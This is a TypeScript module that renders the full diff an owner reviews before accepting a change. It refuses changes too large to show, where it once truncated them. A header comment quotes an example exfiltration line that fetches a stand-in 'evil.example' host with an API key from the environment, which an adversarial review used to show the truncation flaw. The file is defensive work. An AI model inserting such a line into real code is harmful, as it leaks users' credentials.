// Aukora Spatial — the diff the owner reads before accepting a change.
//
// ══ CORRESPONDENCE: WHAT HE READS IS WHAT HE APPROVES ══
//
// This file used to cap a new file at 200 rendered lines and a modification at 400 operations, while
// `review.apply()` wrote the content IN FULL. An adversarial review measured the consequence: a 211-line
// new file with a payload on line 211 rendered as
//
//     +// harmless helper line 200
//     … 12 more lines
//
// …and after accept, on disk:
//
//     fetch("https://evil.example/"+process.env.OPENROUTER_API_KEY)   // never shown
//
// The UI renders the patch in a 230px scroll box, so the marker sits below the fold. Put the visible
// change first and anything past the cap lands unread.
//
// That is not a display defect. The entire product is that the diff IS the proposal — LAW.md's first
// law is that nothing reaches disk without a click, and a click on a document that omits what will be
// written is not consent to what will be written. There were two possible fixes, and only one of them
// is honest: `apply` writing only the rendered portion would put a TRUNCATED FILE on disk. So the diff
// no longer truncates, and a change too large to render in full is REFUSED rather than abridged —
// `DiffTooLarge`, which the caller must not turn into an acceptable card.
//
// Its own module, with no imports at all, for two reasons. It is a pure function of two strings and has
// no business dragging the forge door (and Bun's `import.meta.dir`) into anything that wants to use it;
// and it is the review gate's only visible artefact, so it must be directly testable. The first version
// was wrong in a way only a multi-point change reveals — see core/tests/forgeRenderDiff.test.ts.

/**
 * A unified diff for the owner to READ.
 *
 * Exported for its test rather than for any caller: this is the review gate's only visible artefact,
 * and the first version was wrong in a way that only a multi-point change reveals. A function that
 * load-bearing should be reachable by a test directly, not re-created from its own source text. Line-based, computed here rather than shelled out, because the
 * two sides are strings in memory and writing them to temp files to ask git about them would put the
 * owner's uncommitted work on disk somewhere he did not put it.
 */
/**
 * The ceiling above which a change is REFUSED rather than abridged.
 *
 * Not a display budget. See the correspondence note below: a diff that omits a line the owner then
 * approves is the law broken, so the only honest response to a change too large to read is to decline
 * to offer it as an acceptable card. High enough that no ordinary edit reaches it.
 */
export const MAX_REVIEWABLE_LINES = 20_000;

/**
 * The ceiling on the WHOLE PATCH, in characters — not per file, and not the same ceiling as
 * `MAX_REVIEWABLE_LINES` above.
 *
 * The line ceiling bounds one file at a time and is generous by line count (20,000 new-file lines,
 * 2,500 changed lines): plenty of files pass it while still rendering a patch of hundreds of
 * kilobytes once every file in the round is joined into one string — a long single line (a minified
 * bundle, a base64 blob, a one-line JSON fixture) reaches this ceiling in a handful of lines while
 * never approaching the line count that would have refused it. `surface/door.ts`'s `slimProposal`
 * used to cope with that by SLICING the wire copy of `patch` to this same number, to keep the SSE
 * stream from freezing the browser on a full-file rewrite — display-only, the comment there said, and
 * it was telling the truth about the display. It was not telling the truth about the proposal: the
 * full `files[].before/after` this cap never touched is exactly what `apply()` writes when the owner
 * clicks accept, so a patch over this size showed the owner a card that ended and asked for a decision
 * on bytes past the cut he was never shown. That is the same law `DiffTooLarge` above exists to
 * enforce, reached by a different door — a click on a document that hides what will be written is not
 * consent to what will be written, whether the hiding happens in `renderDiff` or downstream of it.
 *
 * So the ceiling is enforced HERE, at the one number that was already the truth about what the glass
 * can show, and `capture()` refuses a patch past it exactly like `DiffTooLarge` — before a proposal
 * exists to approve. `slimProposal`'s slice stays, pointed at this same exported constant rather than
 * its own copy of the literal, so the two numbers cannot drift apart again; with the refusal in place
 * upstream, that slice can never actually cut anything live any proposal reaching it already satisfies
 * the ceiling by construction. See `core/forge/review.ts`'s `capture()` for the refusal itself and
 * `test/forge-apply-review-gate.test.ts` for the proof through the real route.
 */
export const MAX_REVIEWABLE_CHARS = 12_000;

/** Thrown when a change cannot be rendered in full. The caller must not offer it for acceptance. */
export class DiffTooLarge extends Error {
  constructor(public readonly rel: string, public readonly lines: number) {
    super(`${rel} changes ${lines} lines — too large to render in full, so it is not offered for review`);
    this.name = 'DiffTooLarge';
  }
}

export function renderDiff(rel: string, before: string | null, after: string): string {
  if (before === null) {
    const lines = after.split('\n');
    if (lines.length > MAX_REVIEWABLE_LINES) throw new DiffTooLarge(rel, lines.length);
    const head = `--- /dev/null\n+++ b/${rel}\n@@ new file, ${lines.length} lines @@`;
    return head + '\n' + lines.map((l) => '+' + l).join('\n');
  }

  const A = before.split('\n');
  const B = after.split('\n');

  // Common prefix and suffix come off first — cheap, and it makes the expensive part small.
  let head = 0;
  while (head < A.length && head < B.length && A[head] === B[head]) head++;
  let tail = 0;
  while (tail < A.length - head && tail < B.length - head && A[A.length - 1 - tail] === B[B.length - 1 - tail]) tail++;

  const a = A.slice(head, A.length - tail);
  const b = B.slice(head, B.length - tail);
  if (!a.length && !b.length) return `--- a/${rel}\n+++ b/${rel}\n@@ no textual change @@`;

  // A REAL DIFF, not a two-sided trim.
  //
  // The first version stopped at the trim above and printed everything between the first and last
  // change as one delete block followed by one add block. For a change in a single place that reads
  // like a diff; for a change in FOUR places — an import, a registry entry, a lookup table and a menu
  // row, which is exactly what adding one organ touches — it degenerates into the whole file rendered
  // twice. Measured at 18,009 characters for one organ, in which the actual edits are invisible. A
  // diff the owner cannot read is not a review gate, it is a formality he will start clicking through.
  // THE SAME BUG AT A HIGHER NUMBER. An adversarial review found this: the header above promises the
  // diff never truncates and that an unrenderable change is REFUSED — and `DiffTooLarge` only ever
  // throws on the NEW-FILE path. A MODIFICATION hit this ceiling and returned an abridged summary that
  // does not throw, so the card was acceptable and unreadable at once. Measured on a tracked 89-line
  // file rewritten to 2601 lines:
  //
  //     offered as acceptable : true
  //     patch length (chars)  : 138
  //     patch shows payload   : false
  //     DISK HAS PAYLOAD      : true
  //
  // A 138-character card, accepted, writing 2601 lines. That is LAW.md's first law broken by the same
  // defect this file claims to have fixed — moved from 200 lines to 2500 and left in place.
  //
  // The ceiling stays, because a diff of a million lines helps nobody. What changes is what happens AT
  // it: refuse, exactly as the new-file path does, so nothing unreadable is ever offered for acceptance.
  const MAX = 2500;
  if (a.length > MAX || b.length > MAX) {
    throw new DiffTooLarge(rel, Math.max(A.length, B.length));  }

  // Longest common subsequence over lines. The trimmed region is normally small, and MAX bounds the
  // worst case; this is a reading aid, so clarity beats cleverness.
  const lcs: number[][] = Array.from({ length: a.length + 1 }, () => new Array(b.length + 1).fill(0));
  for (let i = a.length - 1; i >= 0; i--) {
    for (let j = b.length - 1; j >= 0; j--) {
      lcs[i]![j] = a[i] === b[j] ? lcs[i + 1]![j + 1]! + 1 : Math.max(lcs[i + 1]![j]!, lcs[i]![j + 1]!);
    }
  }
  type Op = { t: ' ' | '-' | '+'; line: string; n: number };
  const ops: Op[] = [];
  let i = 0, j = 0;
  while (i < a.length && j < b.length) {
    if (a[i] === b[j]) { ops.push({ t: ' ', line: a[i]!, n: head + i }); i++; j++; }
    else if (lcs[i + 1]![j]! >= lcs[i]![j + 1]!) { ops.push({ t: '-', line: a[i]!, n: head + i }); i++; }
    else { ops.push({ t: '+', line: b[j]!, n: head + j }); j++; }
  }
  while (i < a.length) { ops.push({ t: '-', line: a[i]!, n: head + i }); i++; }
  while (j < b.length) { ops.push({ t: '+', line: b[j]!, n: head + j }); j++; }

  // Group into hunks with three lines of context, so untouched stretches between edits collapse.
  const CTX = 3;
  const keep = new Array(ops.length).fill(false);
  ops.forEach((o, k) => {
    if (o.t === ' ') return;
    for (let x = Math.max(0, k - CTX); x <= Math.min(ops.length - 1, k + CTX); x++) keep[x] = true;
  });

  const out: string[] = [`--- a/${rel}`, `+++ b/${rel}`];
  let printed = 0, skipped = 0;
  for (let k = 0; k < ops.length; k++) {
    if (!keep[k]) { skipped++; continue; }
    if (skipped) { out.push(`@@ … ${skipped} unchanged line${skipped === 1 ? '' : 's'} @@`); skipped = 0; }
    out.push(ops[k]!.t + ops[k]!.line);
    // NO TRUNCATION. See the correspondence note in the header — this line used to read
    // `if (++printed > 400) { out.push('… diff truncated'); break; }` and it broke the one property the
    // review gate exists to provide. The ceiling is enforced before any rendering, by line count.
    printed++;
  }
  return out.join('\n');
}
